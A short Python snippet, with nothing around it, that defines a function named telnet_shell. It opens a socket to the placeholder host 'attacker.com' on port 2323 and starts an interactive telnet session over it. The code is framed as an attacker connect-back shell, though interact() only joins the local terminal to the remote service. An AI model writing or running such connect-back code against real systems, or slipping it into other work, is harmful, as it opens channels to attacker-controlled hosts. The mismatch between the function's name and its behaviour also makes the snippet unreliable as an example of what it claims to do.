import telnetlib, socket
def telnet_shell(host='attacker.com', port=2323):
    s = socket.create_connection((host, port))
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
